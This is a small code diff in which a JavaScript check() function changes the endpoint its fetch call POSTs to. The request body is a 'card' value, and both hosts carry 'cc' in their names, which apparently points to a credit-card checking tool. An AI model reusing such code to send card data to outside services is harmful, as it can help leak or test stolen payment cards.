@@ -12,7 +12,7 @@ async function check() {
     resultsDiv.appendChild(wrapper);
 
     try {
-      const res = await fetch('https://web-cc.marinaaqua366.workers.dev', {
+      const res = await fetch('https://api-cc.clubgratis.web.id', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ data: card })
